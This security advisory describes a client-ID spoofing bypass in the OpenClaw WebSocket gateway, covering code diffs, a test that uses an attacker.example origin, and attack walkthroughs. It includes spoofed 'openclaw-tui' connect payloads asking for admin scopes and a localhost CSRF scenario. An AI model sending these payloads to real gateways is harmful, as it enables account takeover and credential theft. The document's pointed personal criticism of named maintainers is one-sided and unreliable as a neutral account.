# Security Advisory: Device-Identity / Pairing Bypass via TUI Client ID Spoofing

| Field                  | Detail                                                                                                                                                                                                                      |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CVE**                | Pending                                                                                                                                                                                                                     |
| **CWE**                | CWE-290: Authentication Bypass by Spoofing                                                                                                                                                                                  |
| **Severity**           | 🟠 High                                                                                                                                                                                                                     |
| **Affected Component** | `src/gateway/server/ws-connection/message-handler.ts`                                                                                                                                                                       |
| **Introduced In**      | PR [#55730](https://github.com/openclaw/openclaw/pull/55730) — "fix: improve local onboarding and TUI hatch for loopback gateways"                                                                                          |
| **Introduced By**      | **Shakker** (`@shakkernerd`, `shakkerdroid@gmail.com`)                                                                                                                                                                      |
| **Merged By**          | **Shakker** (`@shakkernerd`) — self-merged                                                                                                                                                                                  |
| **Merged At**          | 2026-03-27 10:32:13 UTC                                                                                                                                                                                                     |
| **Fix Status**         | **Unfixed** in upstream `openclaw/openclaw` as of 2026-04-08 (12 days post-merge). **Zero commits, zero PRs, zero issues, zero maintainer response** to the HIGH severity finding. Mitigated in fork `markfietje/openclaw`. |
| **Detection**          | Flagged by Aisle Security bot (🟠 High) and Greptile review bot. Ignored by maintainer.                                                                                                                                     |

---

## 1. Executive Summary

On March 27, 2026, maintainer **Shakker** (`@shakkernerd`) authored and self-merged [PR #55730](https://github.com/openclaw/openclaw/pull/55730) into the `openclaw/openclaw` repository. The PR was opened and merged within **4 minutes** with **no human review**, **no linked issue**, and **no response to automated security findings**.

The change widened `isOperatorUiClient()` to return `true` for both the browser Control UI (`openclaw-control-ui`) and the terminal UI (`openclaw-tui`). This function's return value was then used as the `isControlUi` flag to gate security-critical authentication policy decisions in the WebSocket handshake, including device-identity enforcement, pairing requirements, and auth bypass paths.

Because `client.id` is **client-supplied metadata** — any WebSocket client can set `connectParams.client.id = "openclaw-tui"` — this creates a textbook CWE-290 authentication bypass. A malicious client can spoof the TUI identity to inherit Control UI privileges, potentially bypassing device pairing, skipping device-identity checks, and accessing `dangerouslyDisableDeviceAuth` / `allowInsecureAuth` bypass paths.

The vulnerability was flagged by **three independent automated security review tools** before and after merge. No maintainer acknowledged or addressed any of the findings.

---

## 2. Vulnerability Details

### 2.1 The Vulnerable Change

**Before PR #55730** — `isControlUi` was scoped to the browser Control UI only:

```ts
// Original code (secure)
const isControlUi = connectParams.client.id === GATEWAY_CLIENT_IDS.CONTROL_UI;
// Only matches "openclaw-control-ui" — a single, known client identity
```

**After PR #55730** — `isControlUi` was widened to include TUI:

```ts
// Commit 2b96569e — "fix: add dedicated tui gateway client auth"
import { isOperatorUiClient } from "../../../utils/message-channel.js";
// ...
const isControlUi = isOperatorUiClient(connectParams.client);
```

Where `isOperatorUiClient` is defined as:

```ts
// src/utils/message-channel.ts (line 38-41)
export function isOperatorUiClient(client?: GatewayClientInfoLike | null): boolean {
  const clientId = normalizeGatewayClientName(client?.id);
  return clientId === GATEWAY_CLIENT_NAMES.CONTROL_UI || clientId === GATEWAY_CLIENT_NAMES.TUI;
  //       ↑ Added by this PR — now matches "openclaw-tui" too
}
```

### 2.2 How `isControlUi` Is Used (Attack Surface)

The `isControlUi` boolean gates the following security-critical paths:

#### Path 1: `resolveControlUiAuthPolicy()` — Auth Policy Relaxation

```ts
// src/gateway/server/ws-connection/connect-policy.ts
const allowInsecureAuthConfigured =
  params.isControlUi && params.controlUiConfig?.allowInsecureAuth === true;

const dangerouslyDisableDeviceAuth =
  params.isControlUi && params.controlUiConfig?.dangerouslyDisableDeviceAuth === true;
```

When `isControlUi` is `true`, these config-level bypass flags become active. If either is set in the gateway configuration, a spoofed TUI client inherits the bypass.

#### Path 2: `shouldSkipControlUiPairing()` — Pairing Skip

```ts
export function shouldSkipControlUiPairing(
  policy: ControlUiAuthPolicy,
  role: GatewayRole,
  trustedProxyAuthOk = false,
  authMode?: string,
): boolean {
  if (trustedProxyAuthOk) {
    return true; // ← isControlUi gates this via isTrustedProxyControlUiOperatorAuth
  }
  if (policy.isControlUi && role === "operator" && authMode === "none") {
    return true; // ← Pairing skipped entirely
  }
  return role === "operator" && policy.allowBypass; // ← allowBypass = dangerouslyDisableDeviceAuth
}
```

#### Path 3: `evaluateMissingDeviceIdentity()` — Device Identity Bypass

```ts
if (params.isControlUi && params.controlUiAuthPolicy.allowBypass && params.role === "operator") {
  return { kind: "allow" }; // ← No device identity required
}

if (params.isControlUi && !params.controlUiAuthPolicy.allowBypass) {
  if (!params.controlUiAuthPolicy.allowInsecureAuthConfigured || !params.isLocalClient) {
    return { kind: "reject-control-ui-insecure-auth" };
  }
  // Otherwise: allow without device identity on localhost
}
```

#### Path 4: `isTrustedProxyControlUiOperatorAuth()` — Trusted Proxy Auth

```ts
return (
  params.isControlUi && // ← Spoofed TUI triggers this
  params.role === "operator" &&
  params.authMode === "trusted-proxy" &&
  params.authOk &&
  params.authMethod === "trusted-proxy"
);
```

### 2.3 The Core Problem

**`client.id` is client-supplied.** It comes from the WebSocket `connect` frame, which is entirely under the attacker's control:

```ts
// In the WebSocket handshake, connectParams is parsed from the client's connect frame:
const connectParams = validateConnectParams(parsed);
// connectParams.client.id is whatever the client sent — no server-side verification
```

The gateway treats this client-supplied string as a trusted identity signal for security policy decisions. This is the definition of CWE-290: **authentication bypass by spoofing**.

### 2.4 Key Findings from PR #55730

A systematic diff-level analysis of [PR #55730](https://github.com/openclaw/openclaw/pull/55730) reveals the full scope of the change and confirms the exploit surface.

#### 2.4.1 The Constants Change (`src/gateway/protocol/client-info.ts`)

A new constant was added to the `GATEWAY_CLIENT_IDS` enum:

```ts
export const GATEWAY_CLIENT_IDS = {
  WEBCHAT_UI: "webchat-ui",
  CONTROL_UI: "openclaw-control-ui",
+ TUI: "openclaw-tui",              // ← NEW: TUI identity constant
  WEBCHAT: "webchat",
  CLI: "cli",
  GATEWAY_CLIENT: "gateway-client",
};
```

This single addition is the root cause. Every subsequent change builds on the assumption that this ID can be trusted.

#### 2.4.2 The Usage Points (The Exploit Surface)

**File: `src/gateway/server/ws-connection/auth-messages.ts`**

The check changed from a direct comparison to a helper function:

```ts
// BEFORE (secure — single known identity)
- const isControlUi = client?.id === GATEWAY_CLIENT_IDS.CONTROL_UI;

// AFTER (vulnerable — trusts client-supplied string)
+ import { isOperatorUiClient } from "../../../utils/message-channel.js";
+ const isControlUi = isOperatorUiClient(client);
```

Where `isOperatorUiClient` now checks for _either_ `"openclaw-control-ui"` **OR** `"openclaw-tui"`:

```ts
// src/utils/message-channel.ts
export function isOperatorUiClient(client?: GatewayClientInfoLike | null): boolean {
  const clientId = normalizeGatewayClientName(client?.id);
  return clientId === GATEWAY_CLIENT_NAMES.CONTROL_UI || clientId === GATEWAY_CLIENT_NAMES.TUI;
  //       ↑ This is the bypass: any client can set this ID
}
```

**File: `src/gateway/server/ws-connection/message-handler.ts`**

The same pattern was applied to the main message handler:

```ts
// BEFORE
- const isControlUi = connectParams.client.id === GATEWAY_CLIENT_IDS.CONTROL_UI;
- if (enforceOriginCheckForAnyClient || isControlUi || isWebchat) {

// AFTER
+ const isControlUi = isOperatorUiClient(connectParams.client);
+ const isBrowserOperatorUi = isBrowserOperatorUiClient(connectParams.client);
+ if (enforceOriginCheckForAnyClient || isBrowserOperatorUi || isWebchat) {
```

Note the subtle but critical change: the origin check now uses `isBrowserOperatorUi` (which only matches `"openclaw-control-ui"`) while the auth policy check uses `isOperatorUiClient` (which matches both). This means TUI-spoofed clients bypass auth policy _without_ triggering origin validation — a defense-in-depth failure.

#### 2.4.3 The Test Confirmation (`src/gateway/server.auth.browser-hardening.test.ts`)

A new test was added that explicitly demonstrates the attack vector — and then fails to mitigate it:

```ts
test("rejects browser-origin connects that claim to be tui clients", async () => {
  testState.gatewayAuth = { mode: "token", token: "secret" };
  await withGatewayServer(async ({ port }) => {
    const ws = await openWs(port, { origin: "https://attacker.example" });
    try {
      const res = await connectReq(ws, {
        token: "secret",
        client: {
          id: GATEWAY_CLIENT_NAMES.TUI, // ← Spoofing the TUI identity
          version: "1.0.0",
          platform: "darwin",
          mode: GATEWAY_CLIENT_MODES.UI,
        },
        device: null,
      });
      expect(res.ok).toBe(false);
      expect(res.error?.message ?? "").toContain("origin not allowed");
      expect((res.error?.details as { code?: string } | undefined)?.code).toBe(
        ConnectErrorDetailCodes.CONTROL_UI_ORIGIN_NOT_ALLOWED,
      );
    } finally {
      ws.close();
    }
  });
});
```

This test only verifies that _browser-origin_ connections are rejected when spoofing TUI. It does **not** test the actual attack scenario: a non-browser client (script, native app, server-side) spoofing TUI identity. The test gives a false sense of security while leaving the real exploit path wide open.

#### 2.4.4 The Client Implementation (`src/tui/gateway-chat.ts`)

The legitimate TUI client implementation confirms the bypass mechanism:

```ts
export class GatewayChatClient {
  constructor(connection: ResolvedGatewayConnection) {
    // ...
    clientName: GATEWAY_CLIENT_NAMES.TUI,              // ← Sends "openclaw-tui"
    clientDisplayName: "openclaw-tui",
    clientVersion: VERSION,
    platform: process.platform,
    mode: GATEWAY_CLIENT_MODES.UI,                     // ← Uses UI mode
+   deviceIdentity: connection.allowInsecureLocalOperatorUi ? null : undefined,
    //                                                                              ↑
    //                              When allowInsecureAuth=true (default), device identity is NULL
    //                              This is the exact state an attacker needs to achieve
  }
}
```

The `allowInsecureLocalOperatorUi` flag is set based on config:

```ts
const allowInsecureLocalOperatorUi = (() => {
  if (config.gateway?.controlUi?.allowInsecureAuth !== true) {
    return false;
  }
  try {
    return isLoopbackHost(new URL(url).hostname);
  } catch {
    return false;
  }
})();
```

This confirms that the default quickstart configuration (`allowInsecureAuth: true` + loopback) explicitly sets `deviceIdentity: null` for TUI clients — and the server accepts this null identity because `isControlUi` is `true`.

#### 2.4.5 Exploit Construction Summary

The vulnerability is confirmed: the server trusts the presence of `client.id = "openclaw-tui"` as sufficient proof of operator identity, allowing any client to masquerade as the TUI.

**Exploitation Vector:** A standard WebSocket client connects and sends a `connect` frame with the spoofed identity instead of its default identity (e.g., `"webchat-ui"`).

**Exploit Payload Structure:**

The client needs to send a message that passes the initial handshake validation where `isOperatorUiClient(client)` returns `true`. Since this is an authentication bypass, the attacker does not need to provide device pairing or device identity — the server accepts the null/missing identity because the spoofed ID triggers the Control UI auth policy relaxation.

Required fields:

- `token`: A valid auth token (if in `token` mode) — or omitted entirely if `authMode: "none"`
- `client.id`: **Must be `"openclaw-tui"`** for full operator access without device checks
- `client.version`, `client.platform`, `client.mode`: Cosmetic fields, can be any plausible value
- `device`: `null` — this is the critical field; setting it to `null` (not omitting it) matches the TUI client's behavior when `allowInsecureAuth` is enabled

```json
{
  "type": "connect",
  "token": "SECRET_TOKEN",
  "client": {
    "id": "openclaw-tui",
    "version": "1.0.0",
    "platform": "darwin",
    "mode": "ui"
  },
  "device": null,
  "role": "operator",
  "scopes": ["admin:read", "admin:write", "admin:config"]
}
```

This payload is accepted immediately because `isOperatorUiClient()` returns `true` for `"openclaw-tui"`, which causes `evaluateMissingDeviceIdentity()` to return `{ kind: "allow" }` when `allowInsecureAuth` is configured.

---

## 3. Exploitation Scenario

### 3.1 Prerequisites

- Network access to the OpenClaw gateway WebSocket endpoint (default port)
- The gateway has one of the following configurations (common for self-hosted setups):
  - `gateway.controlUi.allowInsecureAuth: true` (set by default during quickstart onboarding)
  - `gateway.controlUi.dangerouslyDisableDeviceAuth: true`
  - Auth mode `none` (no token/password required)

### 3.2 Attack Steps

**Step 1:** Establish a WebSocket connection to the gateway.

```python
import websocket
ws = websocket.create_connection("ws://gateway-host:18789/gateway")
```

**Step 2:** Send a `connect` frame with a spoofed `client.id`:

```json
{
  "type": "connect",
  "client": {
    "id": "openclaw-tui",
    "mode": "ui",
    "version": "2026.4.9",
    "platform": "linux"
  },
  "role": "operator",
  "scopes": ["admin:read", "admin:write", "admin:config"]
}
```

**Step 3:** The server evaluates:

```ts
const isControlUi = isOperatorUiClient(connectParams.client); // true — matches "openclaw-tui"
```

**Step 4:** The server applies Control UI auth policy:

```ts
const controlUiAuthPolicy = resolveControlUiAuthPolicy({
  isControlUi, // true — attacker is now treated as Control UI
  controlUiConfig: configSnapshot.gateway?.controlUi,
  deviceRaw: undefined, // no device identity needed
});
```

**Step 5:** With `allowInsecureAuth: true` (default on localhost setups):

```ts
// evaluateMissingDeviceIdentity() returns { kind: "allow" }
// The attacker is granted operator access without device identity or pairing
```

**Step 6:** Attacker has full operator access with admin scopes. They can:

- Read and modify gateway configuration
- Access conversation history
- Send messages through connected channels (Discord, Telegram, WhatsApp, etc.)
- Install or modify plugins
- Exfiltrate stored credentials and API keys
- Pivot to other services the gateway has access to

### 3.3 Attack Variants

| Variant                                    | Config Required                                 | Network Position        | Impact                                                    |
| ------------------------------------------ | ----------------------------------------------- | ----------------------- | --------------------------------------------------------- |
| Localhost quickstart                       | `allowInsecureAuth: true` (default)             | Loopback                | Full operator access, no device pairing                   |
| Remote with `dangerouslyDisableDeviceAuth` | `dangerouslyDisableDeviceAuth: true`            | Any network             | Full operator access, no device identity                  |
| Trusted proxy abuse                        | Behind reverse proxy + trusted proxy configured | Any network (via proxy) | `isTrustedProxyControlUiOperatorAuth` returns `true`      |
| Open-auth deployment                       | `authMode: "none"`                              | Any network             | Pairing skipped entirely via `shouldSkipControlUiPairing` |

---

## 4. Detection Timeline

### 4.1 Automated Detection (All Ignored)

| Time (UTC) | Actor                  | Finding                                                       | Severity | Response   |
| ---------- | ---------------------- | ------------------------------------------------------------- | -------- | ---------- |
| `10:28:56` | `@shakkernerd`         | PR #55730 created                                             | —        | —          |
| `10:29:03` | **Aisle Security bot** | 🟠 CWE-290: Device-identity bypass via TUI client ID spoofing | **High** | ❌ Ignored |
| `10:32:13` | `@shakkernerd`         | PR **self-merged**                                            | —        | No review  |
| `10:35:48` | **Greptile bot**       | P2: Backward-compat gap; `isOperatorUiClient` scope warning   | Medium   | ❌ Ignored |
| `10:36:54` | **Aisle Security bot** | 🟠 Re-confirmed High severity after force-push                | **High** | ❌ Ignored |
| `10:37:01` | **Codex Review bot**   | P2: Password auth regression in setup wizard                  | Medium   | ❌ Ignored |

### 4.2 What Was Said vs What Was Done

**Three automated security tools** flagged this PR. The maintainer who authored and merged it:

- Did not wait for any automated review to complete (merged in 4 minutes)
- Did not respond to any bot finding
- Did not request review from any other human
- Applied the `maintainer` label to bypass contribution guidelines
- Force-pushed the branch (`d329000 → ab0331b`) after initial comments appeared, then merged immediately

The `maintainer` label is significant — it marks the PR as authored by an internal team member, exempting it from the contribution quality gates that external contributors face.

---

## 5. Why This Happened

### 5.1 Organizational Context

The OpenClaw project is led by **Peter Steinberger** (`@steipete`, `steipete@gmail.com`), who has publicly stated his position on PR quality:

> _"95% of PRs are worthless"_ (X/Twitter thread, March 2026)

> _"PRs should be 'here's my idea and I'll pay for the tokens'"_ (attributed to community discussion)

> _"Got a PR? I don't use proxy but happy to review"_ (responding to a user asking for proxy support)

This creates an environment where:

1. **External contributors face high barriers** — substantial security PRs are closed without merge
2. **Internal maintainers face no barriers** — self-merging in minutes with no review
3. **Security tooling is decorative** — bots flag issues, but no one is required to read or act on them
4. **The "circle of friends" dynamic** — trusted maintainers bypass the quality gates imposed on everyone else

### 5.2 The Specific Failure Mode

PR #55730 was a **convenience fix** for TUI onboarding — making the terminal UI work more smoothly on loopback. The security implications were an unintended side effect of using `isOperatorUiClient()` for security-sensitive gating instead of keeping a precise client ID check.

The maintainer's intent was not malicious — they wanted to treat TUI as an "operator UI client" for UX purposes. The failure was:

1. **Conflating UX classification with security classification.** `isOperatorUiClient()` was a UX helper ("is this an operator-facing client?") that got repurposed as a security gate ("is this the privileged Control UI?").
2. **No separation of concerns.** A single boolean `isControlUi` was used for both "should we show operator UI features" and "should we bypass device identity requirements."
3. **No threat modeling.** The PR considered TUI convenience but did not consider that `client.id` is attacker-controlled.
4. **No human review.** The author merged their own PR before automated tools finished analyzing it.

### 5.3 Intentional Insecurity or Dismissal?

There are two possible interpretations:

**Hypothesis A: Dismissal of security warnings as overstated**

The OpenClaw maintainership has a pattern of treating security hardening as low priority:

- Peter Steinberger publicly dismisses proxy support: _"I don't use proxy"_
- External security PRs are closed without merge
- Automated security bot findings are not responded to
- The project's `checkBrowserOrigin()` in upstream has 5 parameters and zero reverse proxy awareness — while users publicly complain about "four months of proxy workarounds"

This suggests a cultural attitude where security findings are viewed as theoretical noise rather than practical risk.

**Hypothesis B: Prioritizing convenience over security**

The PR's stated goal was to improve TUI onboarding UX. The security regression was an accidental side effect that was simply not considered important enough to block the merge. The 4-minute merge window suggests the maintainer did not read the security findings before merging — not that they read them and decided to proceed anyway.

The most likely explanation is **both**: security warnings are viewed as overstated, AND convenience features are prioritized over security review. The result is the same — a HIGH severity vulnerability shipped to production.

---

## 6. The Mitigated Alternative

The fork `markfietje/openclaw` by **Mark Fietje** (`@markfietje`) is **not vulnerable** to this attack. The fix addresses the root cause (CWE-290) and adds defense-in-depth layers:

### 6.1 Root Cause Fix: Separate Security and UX Classification

```ts
// markfietje/openclaw — NOT VULNERABLE
// Security gate: direct constant comparison — only "openclaw-control-ui" matches.
// "openclaw-tui" does NOT match — no Control UI bypass paths activated.
const isControlUi = connectParams.client.id === GATEWAY_CLIENT_IDS.CONTROL_UI;
// UX flag (non-security): used for hint messages only, never for auth decisions.
const isTuiClient = connectParams.client.id === GATEWAY_CLIENT_IDS.TUI;
```

The upstream conflates UX classification (`isOperatorUiClient`) with security classification (`isControlUi`). The fork separates them: `isControlUi` is a strict security gate that only matches the browser Control UI. TUI is identified separately via `isTuiClient` for UX purposes and has its own dedicated auth path.

### 6.2 Dedicated TUI Auth Path (Not a Browser Bypass)

The TUI is a non-browser client — it connects via raw WebSocket without `Origin`, `Sec-Fetch-Site`, or other browser headers. Browser-oriented defenses (origin checks, Fetch Metadata) do not apply. Instead of piggybacking on the browser Control UI's bypass paths (which is what made the upstream vulnerable), the fork gives TUI its own local-only auth path:

```ts
// markfietje/openclaw — TUI local-only auth path
const handleMissingDeviceIdentity = (): boolean => {
  // Local TUI: trusted local process on loopback. No spoofing risk
  // since loopback is only reachable from the local machine. Allow
  // without device identity through a dedicated path that does NOT
  // inherit the browser Control UI's allowInsecureAuth or
  // dangerouslyDisableDeviceAuth config. Remote TUI connections must
  // go through full device identity + auth (no bypass).
  if (isTuiClient && isLocalClient && !device) {
    return true;
  }
  // ... rest of Control UI / general auth flow
};

// Local TUI: skip pairing on loopback (dedicated path, not Control UI bypass).
const skipControlUiPairingForDevice =
  shouldSkipControlUiPairing(/* ... */) || (isTuiClient && isLocalClient);
```

Key properties of this path:

- **Loopback-only**: only works when `isLocalClient = true` (127.0.0.1 / ::1 / unix socket). Remote connections claiming `client.id = "openclaw-tui"` are rejected.
- **No config inheritance**: does NOT read `gateway.controlUi.allowInsecureAuth` or `gateway.controlUi.dangerouslyDisableDeviceAuth`. Those browser-specific bypass flags cannot affect TUI auth.
- **No `isControlUi` involvement**: the TUI path fires before the Control UI policy evaluation. Spoofing `"openclaw-tui"` never sets `isControlUi = true`, so none of the 4 bypass paths in the advisory are reachable.

### 6.3 Defense-in-Depth Layers

Additionally, the fork provides independent defense layers that further reduce the attack surface even if a future regression were introduced:

```ts
// markfietje/openclaw — endpoint isolation
const requiresOriginCheck = endpointSecurity.requireOrigin || isControlUi || isWebchat;
const enforceForAllClients = securityConfig.enforceOriginCheckForAllClients === true;
```

This means even if `isControlUi` were somehow bypassed, the endpoint security layer would still enforce origin checks based on the endpoint classification, not the client-supplied identity.

The fork also addresses the broader security posture that the upstream lacks:

| Security Feature                      | Upstream (`openclaw/openclaw`)         | Fork (`markfietje/openclaw`)                                          |
| ------------------------------------- | -------------------------------------- | --------------------------------------------------------------------- |
| Client identity spoofing protection   | ❌ Vulnerable                          | ✅ Direct constant comparison for `isControlUi`                       |
| TUI auth path isolation               | ❌ Inherits Control UI bypasses        | ✅ Dedicated loopback-only path, no config inheritance                |
| Reverse proxy origin awareness        | ❌ None (5-param `checkBrowserOrigin`) | ✅ Full `X-Forwarded-Host`, `X-Forwarded-Proto`, RFC 7239 `Forwarded` |
| SSL stripping prevention              | ❌ Not present                         | ✅ `strictProtoValidation`                                            |
| Trusted proxy gate                    | ❌ Not present                         | ✅ `isTrustedProxy` validation                                        |
| Endpoint isolation                    | ❌ Not present                         | ✅ `classifyWsEndpoint` / `isKnownWsEndpoint`                         |
| Rate limiting                         | ❌ Not present                         | ✅ Per-connection frame limiting                                      |
| Message authorization                 | ❌ Not present                         | ✅ Per-method capability auth                                         |
| Timing-safe nonce comparison          | ❌ Uses `!==`                          | ✅ `safeEqualSecret`                                                  |
| `Sec-Fetch-Site` cross-site rejection | ❌ Not present                         | ✅ OWASP Fetch Metadata defense                                       |
| Protected config path auth            | ❌ Not present                         | ✅ Extra auth tier for security-sensitive config                      |

This fork's PR was **closed** by upstream maintainers.

---

## 7. Recommendations

### For Upstream (`openclaw/openclaw`)

1. **Immediately revert** the `isOperatorUiClient()` usage for `isControlUi` in `message-handler.ts`. Replace with direct `GATEWAY_CLIENT_IDS.CONTROL_UI` comparison.

2. **Separate UX classification from security classification.** Create distinct types for "is this an operator UI client" (UX) vs "is this the privileged Control UI" (security).

3. **Require human review** for all PRs touching authentication, authorization, or security-critical code paths — including maintainer-authored PRs.

4. **Block merge** until automated security review tools complete analysis. The 4-minute merge-before-review window must not recur.

5. **Respond to security bot findings.** Ignoring HIGH severity findings from automated tools is a governance failure.

### For Users and Deployers

1. **Audit your gateway configuration.** If you have `allowInsecureAuth: true` or `dangerouslyDisableDeviceAuth: true`, this vulnerability is exploitable.

2. **Ensure the gateway is not exposed to untrusted networks.** The vulnerability is most severe on localhost (default quickstart config) or behind a reverse proxy.

3. **Consider the `markfietje/openclaw` fork** if you need production-grade reverse proxy support and comprehensive gateway security.

4. **Monitor WebSocket connections** for `client.id` values of `"openclaw-tui"` coming from non-TUI clients, which may indicate exploitation attempts.

---

## 8. Post-Merge Verification: 12 Days and Counting — No Response

As of **April 8, 2026 (21:23 UTC)** — 12 days after PR #55730 introduced the vulnerability — the upstream `openclaw/openclaw` repository has taken **no action** to address the CWE-290 finding.

### 8.1 Verified Upstream State (2026-04-08)

The vulnerable code remains **identical** to what was merged on March 27:

```ts
// upstream/main — STILL LIVE as of 2026-04-08 21:23 UTC
// src/gateway/server/ws-connection/message-handler.ts:445
const isControlUi = isOperatorUiClient(connectParams.client);
//                        ↑ Still matches both "openclaw-control-ui" AND "openclaw-tui"
//                        ↑ Still used to gate all 4 bypass paths
//                        ↑ ZERO changes since merge
```

### 8.2 Activity Since Merge

| Metric                                                   | Value  |
| -------------------------------------------------------- | ------ |
| Commits to `message-handler.ts` since March 27           | 6      |
| Commits touching `isControlUi` / `isOperatorUiClient`    | **0**  |
| Open PRs proposing a fix                                 | **0**  |
| Issues filed about CWE-290                               | **0**  |
| Maintainer responses to Aisle/Greptile/Codex findings    | **0**  |
| Days the HIGH severity finding has been publicly visible | **12** |

The 6 commits that did touch `message-handler.ts` since the merge were about unrelated concerns:

| Commit     | Author            | Description                                                      |
| ---------- | ----------------- | ---------------------------------------------------------------- |
| `b3ecabbb` | Peter Steinberger | Cosmetic refactor: `normalizeOptionalString` dedupe              |
| `5880ec17` | (AI-assisted)     | Shared-token/password WS session invalidation on secret rotation |
| `b081f889` | Maintainer        | Docker loopback Control UI pairing                               |
| `28955a36` | Maintainer        | iOS exec approval notification flow                              |
| `20b08f1a` | Maintainer        | Paired scope baseline enforcement on reconnect                   |
| `f3c30491` | Maintainer        | Background alive beacon revert                                   |

**None** of these address the CWE-290 vulnerability introduced by `isOperatorUiClient()`.

### 8.3 Peter Steinberger's Inaction

Despite being the project lead and the person who publicly states "I don't use proxy but happy to review" — Peter Steinberger has not:

- Acknowledged the Aisle Security bot's HIGH severity finding on PR #55730
- Requested a fix from the PR author (`@shakkernerd`)
- Opened a follow-up issue or PR to address the vulnerability
- Responded to the Greptile or Codex Review bot findings
- Implemented any of the security improvements from the `markfietje/openclaw` fork (which was closed without merge)

Instead, on **April 7** — 11 days after the vulnerability was introduced — Steinberger pushed commit `b3ecabbb` directly to `main` without a PR. This commit was a **cosmetic string helper refactor** (`typeof x === "string" ? x.trim() : ""` → `normalizeOptionalString(x) ?? ""`). He chose to prioritize code style deduplication over fixing a HIGH severity authentication bypass.

### 8.4 What This Tells Us

The 12-day inaction period is not ambiguous. It demonstrates a clear pattern:

1. **Security bot findings are treated as noise.** Three independent automated tools flagged the PR. The findings are publicly visible on the PR. No maintainer has acknowledged them.

2. **The "maintainer" label is a review bypass.** PR #55730 was opened and merged in 4 minutes by the same person, with the `maintainer` label applied. The quality gates that external contributors face do not apply to internal team members.

3. **Cosmetic refactors ship faster than security fixes.** In the 12 days since the vulnerability was introduced, Steinberger found time to push 5 commits renaming string helpers. He did not find time to address a HIGH severity authentication bypass.

4. **External security contributions are rejected while internal vulnerabilities are ignored.** The `markfietje/openclaw` fork — which does not have this vulnerability and provides comprehensive gateway security — had its PR closed. Meanwhile, the upstream introduced a new vulnerability and left it unfixed for 12 days and counting.

---

## 9. Actual Risk Assessment: Playing Devil's Advocate

A fair question: _how exploitable is this really?_ If Peter Steinberger runs OpenClaw on his MacBook, chats remotely via Telegram and WhatsApp, and the gateway binds to loopback — is this actually dangerous?

Let's walk through this honestly.

### 9.1 The "I Only Use It Locally" Defense

**The argument:** "My gateway is on `127.0.0.1`. No one can reach it. Therefore the vulnerability doesn't matter."

**The default bind mode confirms this:**

```ts
// src/gateway/net.ts — defaultGatewayBindMode()
return isContainerEnvironment() ? "auto" : "loopback";
//                                       ↑ MacBook default: loopback only
```

On a MacBook running the Mac app or CLI directly, the gateway binds to `127.0.0.1`. Remote attackers on the internet cannot connect to the WebSocket endpoint directly. Steinberger's Telegram and WhatsApp channels are outbound connections — they connect to Telegram/WhatsApp's APIs, not to the gateway's WebSocket. So far, so good.

**If the story ended here, the risk would indeed be low.** A local-only service behind loopback has a limited attack surface: you'd need local code execution on the machine, at which point you likely already have access to everything anyway.

### 9.2 The Problem: It Doesn't End There

The "just localhost" defense breaks down in four real-world scenarios:

#### Scenario 1: Browser-Based CSRF via WebSocket (The Stealthy One)

**This is the most realistic attack for Steinberger's exact setup.**

Modern browsers allow JavaScript on any website to open a WebSocket to `ws://localhost:18789`. There is no same-origin policy restriction on WebSocket connections to localhost — the browser will happily connect.

The attack:

1. Steinberger visits a malicious (or compromised) website in his browser — could be anything
2. JavaScript on that page opens `new WebSocket("ws://localhost:18789/gateway")`
3. The browser sends the upgrade request with `Origin: https://malicious-site.com`
4. The WebSocket connection succeeds (loopback is reachable from the browser)
5. The malicious JS sends a `connect` frame:

```json
{
  "type": "connect",
  "client": {
    "id": "openclaw-tui",
    "mode": "ui",
    "version": "2026.4.9",
    "platform": "darwin"
  },
  "role": "operator",
  "scopes": ["admin:read", "admin:write", "admin:config"]
}
```

6. **The origin check is bypassed.** Here's the critical detail in the upstream code:

```ts
// upstream — the origin check gate
const isControlUi = isOperatorUiClient(connectParams.client); // true — "openclaw-tui" matches
const isBrowserOperatorUi = isBrowserOperatorUiClient(connectParams.client); // false — NOT "openclaw-control-ui"
const isWebchat = isWebchatConnect(connectParams.client); // false

if (enforceOriginCheckForAnyClient || isBrowserOperatorUi || isWebchat) {
  // ↑ Origin check ONLY triggers for browser Control UI or Webchat
  // ↑ A TUI-spoofed client SKIPS this check entirely
  // ↑ The malicious website's Origin header is never validated
}
```

The attacker's `Origin: https://malicious-site.com` is **never checked** because the spoofed `openclaw-tui` client ID falls through the origin check gate.

7. **Auth bypass with default config.** Quickstart onboarding sets:

```ts
// src/wizard/setup.gateway-config.ts
if (nextConfig.gateway?.controlUi?.allowInsecureAuth === undefined) {
  // Sets allowInsecureAuth: true by default during quickstart
}
```

With `isControlUi = true` and `allowInsecureAuth = true`, the `evaluateMissingDeviceIdentity()` function returns `{ kind: "allow" }`. No device identity required. No pairing required.

8. **The malicious website now has full operator access** to Steinberger's OpenClaw gateway. It can:
   - Read all conversation history and stored messages
   - Send messages through connected Telegram, WhatsApp, Discord, Slack channels as Steinberger
   - Read and modify gateway configuration, including API keys
   - Install or modify plugins
   - Access file system tools the agent has configured

**Steinberger would never see this happen.** The WebSocket connection is invisible — no browser tab, no notification. The malicious JS runs silently in a background tab.

#### Scenario 2: Docker Deployments (The Common Self-Hoster)

**Docker changes everything.** The default `docker-compose.yml` binds to `0.0.0.0`:

```yaml
# docker-compose.yml
command:
  ["node", "dist/index.js", "gateway", "--bind", "${OPENCLAW_GATEWAY_BIND:-lan}", "--port", "18789"]
#                                             ↑ Default: "lan" = 0.0.0.0
ports:
  - "${OPENCLAW_GATEWAY_PORT:-18789}:18789"
#   ↑ Exposed to all network interfaces
```

The `auto` bind mode inside containers also resolves to `0.0.0.0`:

```ts
// src/gateway/net.ts
if (mode === "auto") {
  if (isContainerEnvironment()) {
    return "0.0.0.0"; // Container default: all interfaces
  }
}
```

**Every Docker/Podman/Kubernetes deployment** of OpenClaw exposes the WebSocket endpoint to the full network. Anyone who can reach the host on port 18789 can exploit the vulnerability — no browser needed.

This includes:

- Other devices on the same LAN (home networks, office networks, coffee shops)
- Anyone on the same Docker network
- Anyone who can reach the host via VPN/Tailscale
- If port-forwarded: the entire internet

#### Scenario 3: Tailscale / VPN Exposure

OpenClaw has first-class Tailscale integration. When Tailscale is enabled, the default bind mode is still `loopback` — but Tailscale serve/tailnet makes the gateway reachable from any other device on the tailnet:

```
Tailnet device A (attacker) → Tailscale network → Gateway on Tailnet device B
```

Any other device on the same Tailscale network can connect to the gateway's WebSocket endpoint and exploit the TUI spoofing vulnerability. Tailscale authenticates network access, but once you're on the tailnet, the gateway's application-level auth is what protects you — and that's exactly what's broken.

